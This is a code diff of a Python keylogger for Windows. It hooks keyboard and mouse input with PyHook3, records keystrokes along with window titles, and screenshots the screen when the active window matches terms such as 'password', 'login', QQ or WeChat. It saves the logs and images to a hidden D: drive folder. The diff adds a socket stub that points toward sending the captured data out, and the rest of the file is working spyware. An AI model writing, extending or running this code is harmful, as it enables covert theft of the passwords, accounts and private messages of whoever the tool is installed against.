@@ -2,6 +2,7 @@ import pythoncom
 import PyHook3
 import os
 import time
+import socket
 from PIL import ImageGrab
 
 lists=['百度','QQ','哔哩哔哩','微博','微信','密码','password','账号','account','login','kali linux','bilibili']
@@ -10,23 +11,26 @@ save_to=1
 title_word=""
 global_title=""
 
-def simple_count(file_name):
-    lines = 0
-    for _ in open(file_name):
-        lines += 1
-    return lines
+def server_connect():
+    tcpSock=socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+    tcpSock.setsockopt(socket.SOL_SOCKET,socket.SO_REUSEADDR,1)
+
+def iter_count(file_name):
+    from itertools import takewhile, repeat
+    f = open(file_name,'r')
+    buf_gen = takewhile(lambda x: x, (f.read(1024**2) for _ in repeat(None)))
+    return sum(buf.count('\n') for buf in buf_gen)
 
 def write_msg_to_txt(msg):
     if os.path.exists('D:\\QQdata\\data\\Monitor.txt')==False:
         os.system('mkdir d:\\QQdata\\data\\xx11 >nul')
         os.system('type nul > d:\\QQdata\\data\\Monitor.txt')
+        quit()
     fname='D:/QQdata/data/Monitor.txt'
 
-    cl=simple_count(fname) 
-    if cl >=10:
-        f=open(fname,'w')
-        f.write('\x00')
-        f.close()
+    cl=iter_count(fname)+1
+    if cl >=2000:
+        os.system('type nul > d:\\QQdata\\data\\Monitor.txt')
 
     f=open(fname,'a')
     f.write(msg+'\x0A')
@@ -37,25 +41,33 @@ def get_local_time(press):
         return time.strftime('%Y-%m-%d_%H:%M: ', time.localtime(time.time()))
     else:
         return time.strftime('%Y-%m-%d_%Hh%Mm%Ss', time.localtime(time.time()))
-def get_local_image():
+
+def get_local_image(dirpath):
+    pic_lists =os.listdir(dirpath)
+    print(len(pic_lists))
+    if len(pic_lists) >1000:
+        for pl in pic_lists:
+            fpath=dirpath+pl
+            if os.path.isfile(fpath):
+                os.remove(fpath)
+
     pic=ImageGrab.grab()
     pic_name='D:/QQdata/data/xx11/mouse_%s.jpg' %get_local_time("")
     pic.save('%s' %pic_name)
-    return pic_name 
+    return pic_name
+
 def onMouseEvent(event):
     global lists
     global MSG
     global global_title
     mouse_status=event.MessageName
-
     pic_msg=""
     if mouse_status=="mouse left down" or mouse_status=="mouse right down":
         if global_title in lists:
             if MSG!="":
                 write_msg_to_txt(MSG)
-                pic_msg=get_local_image()
+                pic_msg=get_local_image('d:\\QQdata\\data\\xx11\\')
                 write_msg_to_txt(pic_msg)
-#            print( "MessageName:",event.MessageName)
             global_title=""
     # 也就是说你的鼠标看起来会僵在那儿，似乎失去响应了
     return True
@@ -68,7 +80,7 @@ def onKeyboardEvent(event):
     global global_title
 
     keyid=event.Ascii
-    keychar=chr(event.Ascii) 
+    keychar=chr(event.Ascii)
     keyword=event.Key
     title=event.WindowName
 
@@ -94,7 +106,7 @@ def onKeyboardEvent(event):
     if title_status==0:
         if (title_word!=title and keyword!="Lcontrol" and keyword!="Rcontrol"
             and keyword!="Lmenu" and keyword!="Rmenu" and keyword!="Capital"
-            and keyword!="Lshift" and keyword!="Rshift" 
+            and keyword!="Lshift" and keyword!="Rshift"
             ):
             title_word=title
             MSG=get_local_time('keyboard')+title+"窗口: "
